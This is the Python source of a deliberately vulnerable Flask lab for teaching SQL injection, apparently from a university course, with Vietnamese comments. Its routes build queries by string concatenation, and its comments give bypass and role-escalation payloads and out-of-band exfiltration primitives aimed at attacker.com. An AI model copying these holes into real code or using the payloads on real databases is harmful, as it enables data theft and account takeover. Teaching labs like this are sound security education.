"""
===========================================================================
 SQL INJECTION LAB  -  DBS401 / FPT University
===========================================================================
 CANH BAO GIAO DUC:
   - Ung dung nay CO Y chua lo hong SQL injection de hoc tap.
   - CHI chay tren localhost (127.0.0.1). KHONG deploy ra Internet.
   - KHONG dung ky thuat o day tren he thong ban khong duoc phep kiem thu.

 Moi route minh hoa MOT dang SQLi. Phan code dung truy van bi loi deu
 duoc danh dau bang comment "# [VULN] ...".

 Chay:
   python3 init_db.py        # tao lab.db
   python3 app.py            # mo http://127.0.0.1:5000
===========================================================================
"""
import os
import sqlite3
import time
import urllib.parse
import urllib.request

from flask import Flask, request, redirect, render_template, session, url_for

APP_DIR = os.path.dirname(__file__)
DB_PATH = os.path.join(APP_DIR, "lab.db")

# Dia chi "server cua attacker" (collector) de minh hoa out-of-band exfiltration.
# Trong thuc te day la Burp Collaborator / interactsh / mot DNS-HTTP server ban kiem soat.
OOB_COLLECTOR = os.environ.get("OOB_COLLECTOR", "http://127.0.0.1:5001")


def _dns_lookup(host):
    """
    Mo phong primitive OOB: CSDL "phan giai ten mien" -> thuc chat gui ve collector.
    Tra ve chuoi rong de truy van van chay binh thuong (OOB la blind).
    Tuong duong thuc te:
      MySQL   : LOAD_FILE(CONCAT('\\\\', data, '.attacker.com\\x'))
      MSSQL   : exec master..xp_dirtree '\\\\'+data+'.attacker.com\\x'
      Oracle  : UTL_INADDR.get_host_address(data||'.attacker.com')
      Postgres: COPY ... TO PROGRAM / dblink
    """
    try:
        url = f"{OOB_COLLECTOR}/dns?host={urllib.parse.quote(str(host))}"
        urllib.request.urlopen(url, timeout=2).read()
    except Exception:
        pass  # OOB that bai -> im lang, giong nhu thuc te
    return ""

app = Flask(__name__)
app.secret_key = "lab-only-not-secret"


def get_db():
    """Mo ket noi SQLite va dang ky ham tuy bien de ho tro day du cac dang SQLi."""
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    # SQLite khong co SLEEP() -> dang ky de payload time-based kieu MySQL hoat dong that.
    con.create_function("sleep", 1, lambda n: time.sleep(float(n)) or 0)
    # SQLite khong co ham mang -> dang ky dns_lookup() de minh hoa OUT-OF-BAND SQLi.
    con.create_function("dns_lookup", 1, _dns_lookup)
    return con


@app.route("/")
def index():
    return render_template("index.html")


# ---------------------------------------------------------------------------
# 1) ERROR-BASED  +  2) UNION-BASED
#    /products?id=1        -> tra ve chi tiet 1 san pham (de UNION & error)
#    /products?search=usb  -> tim kiem (cung co the UNION qua LIKE)
#    Loi SQL duoc hien thi ra trang (debug) -> phuc vu error-based detection.
# ---------------------------------------------------------------------------
@app.route("/products")
def products():
    con = get_db()
    cur = con.cursor()
    rows, error, query = [], None, None

    pid = request.args.get("id")
    search = request.args.get("search")

    try:
        if pid is not None:
            # [VULN] Noi chuoi truc tiep -> error-based & UNION-based SQLi
            query = f"SELECT id, name, description FROM products WHERE id = {pid}"
            cur.execute(query)
            rows = cur.fetchall()
        elif search is not None:
            # [VULN] Noi chuoi trong LIKE -> UNION-based SQLi
            query = (
                "SELECT id, name, description FROM products "
                f"WHERE name LIKE '%{search}%'"
            )
            cur.execute(query)
            rows = cur.fetchall()
        else:
            cur.execute("SELECT id, name, description FROM products")
            rows = cur.fetchall()
    except Exception as exc:
        # [VULN] Lo thong bao loi chi tiet -> ho tro error-based
        error = f"{type(exc).__name__}: {exc}"
    finally:
        con.close()

    return render_template("products.html", rows=rows, error=error, query=query)


# ---------------------------------------------------------------------------
# 3) BOOLEAN-BASED BLIND
#    /check?username=admin -> chi tra ve "EXISTS" / "NOT FOUND", khong lo du lieu.
#    Phan biet TRUE/FALSE qua su khac biet cua trang.
# ---------------------------------------------------------------------------
@app.route("/check")
def check():
    con = get_db()
    cur = con.cursor()
    result = None
    username = request.args.get("username")

    if username is not None:
        try:
            # [VULN] Noi chuoi -> boolean-blind SQLi
            query = f"SELECT id FROM users WHERE username = '{username}'"
            cur.execute(query)
            result = "EXISTS" if cur.fetchone() else "NOT FOUND"
        except Exception:
            # Co y NUOT loi -> blind that su (khong co error-based ho tro)
            result = "NOT FOUND"
        finally:
            con.close()

    return render_template("check.html", result=result, username=username)


# ---------------------------------------------------------------------------
# 4) TIME-BASED BLIND
#    /track?code=ABC -> luon tra ve cung mot thong bao, khong phan biet TRUE/FALSE.
#    Chi con kenh thoi gian: dung sleep() de suy luan tung bit.
# ---------------------------------------------------------------------------
@app.route("/track")
def track():
    con = get_db()
    cur = con.cursor()
    code = request.args.get("code")

    if code is not None:
        try:
            # [VULN] Noi chuoi -> time-based blind SQLi
            query = f"SELECT id FROM products WHERE name = '{code}'"
            cur.execute(query)
            cur.fetchall()
        except Exception:
            pass
        finally:
            con.close()
        # Phan hoi KHONG doi theo ket qua -> buoc dung time-based
        return render_template("track.html", code=code, done=True)

    return render_template("track.html", code=None, done=False)


# ---------------------------------------------------------------------------
# 5) AUTHENTICATION BYPASS
#    /login -> bypass bang ' OR '1'='1' --
# ---------------------------------------------------------------------------
@app.route("/login", methods=["GET", "POST"])
def login():
    message = None
    query = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        con = get_db()
        cur = con.cursor()
        try:
            # [VULN] Noi chuoi ca username lan password -> auth bypass
            query = (
                "SELECT id, username, role FROM users "
                f"WHERE username = '{username}' AND password = '{password}'"
            )
            cur.execute(query)
            row = cur.fetchone()
            if row:
                session["user"] = row["username"]
                session["role"] = row["role"]
                return redirect(url_for("dashboard"))
            message = "Sai thong tin dang nhap."
        except Exception as exc:
            message = f"Loi: {exc}"
        finally:
            con.close()

    return render_template("login.html", message=message, query=query)


@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect(url_for("login"))
    return render_template("dashboard.html", user=session["user"], role=session.get("role"))


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))


# ---------------------------------------------------------------------------
# 6) STACKED QUERIES
#    /feedback -> dung executescript() cho phep nhieu cau lenh ngan cach bang ';'
#    Co the chen: '; UPDATE users SET role='admin' WHERE username='alice'; --
# ---------------------------------------------------------------------------
@app.route("/feedback", methods=["GET", "POST"])
def feedback():
    message = None
    query = None
    if request.method == "POST":
        name = request.form.get("name", "")
        con = get_db()
        cur = con.cursor()
        try:
            # [VULN] executescript() chay NHIEU cau lenh -> stacked queries
            query = f"INSERT INTO feedback (username, message) VALUES ('{name}', 'thanks');"
            cur.executescript(query)
            con.commit()
            message = "Da ghi nhan phan hoi."
        except Exception as exc:
            message = f"Loi: {exc}"
        finally:
            con.close()

    # Hien thi feedback hien co de thay ket qua stacked-query
    con = get_db()
    cur = con.cursor()
    cur.execute("SELECT username, message FROM feedback ORDER BY id DESC LIMIT 10")
    items = cur.fetchall()
    con.close()
    return render_template("feedback.html", message=message, items=items, query=query)


# ---------------------------------------------------------------------------
# 7) SECOND-ORDER SQL INJECTION
#    Buoc 1: /register luu username (co tham so hoa -> AN TOAN khi ghi).
#    Buoc 2: /profile doc lai username da luu va noi vao truy van khac -> payload
#            "nap" o buoc 1 moi KICH HOAT o buoc 2.
# ---------------------------------------------------------------------------
@app.route("/register", methods=["GET", "POST"])
def register():
    message = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        con = get_db()
        cur = con.cursor()
        try:
            # AN TOAN o buoc ghi: dung tham so hoa, payload duoc luu NGUYEN VAN.
            cur.execute(
                "INSERT INTO users (username, password, role) VALUES (?, ?, 'user')",
                (username, password),
            )
            con.commit()
            session["pending_user"] = username
            message = f"Dang ky thanh cong: {username}. Hay mo /profile."
        except Exception as exc:
            message = f"Loi: {exc}"
        finally:
            con.close()
    return render_template("register.html", message=message)


@app.route("/profile")
def profile():
    con = get_db()
    cur = con.cursor()
    rows, error, query = [], None, None
    # Lay username vua dang ky (hoac tu tham so ?u= de tien thu nghiem)
    username = request.args.get("u") or session.get("pending_user")

    if username:
        try:
            # [VULN] SECOND-ORDER: gia tri da luu trong DB duoc noi chuoi o day.
            # Du buoc ghi an toan, buoc doc lai van dinh lo hong.
            query = f"SELECT id, username, email FROM users WHERE username = '{username}'"
            cur.execute(query)
            rows = cur.fetchall()
        except Exception as exc:
            error = f"{type(exc).__name__}: {exc}"
        finally:
            con.close()

    return render_template("profile.html", rows=rows, error=error, query=query, username=username)


# ---------------------------------------------------------------------------
# OUT-OF-BAND (OOB) SQLi
#    /lookup?host=example.com -> truy van blind HOAN TOAN:
#      khong in du lieu, khong lo loi, khong tao do tre.
#    Kenh duy nhat de rut du lieu ra la OOB: ep CSDL goi dns_lookup() ve collector.
# ---------------------------------------------------------------------------
@app.route("/lookup")
def lookup():
    host = request.args.get("host")
    done = False
    if host is not None:
        con = get_db()
        cur = con.cursor()
        try:
            # [VULN] Noi chuoi -> OOB (va ca blind) SQLi
            query = f"SELECT id FROM products WHERE name = '{host}'"
            cur.execute(query)
            cur.fetchall()
        except Exception:
            pass  # nuot loi: khong co error-based ho tro
        finally:
            con.close()
        done = True
    # Phan hoi luon giong nhau, khong chenh thoi gian -> buoc dung OOB
    return render_template("lookup.html", host=host, done=done, collector=OOB_COLLECTOR)


if __name__ == "__main__":
    if not os.path.exists(DB_PATH):
        print("[!] Chua co lab.db. Chay truoc: python3 init_db.py")
    # Chi bind localhost. debug=True de xem traceback khi hoc.
    app.run(host="127.0.0.1", port=5000, debug=True)
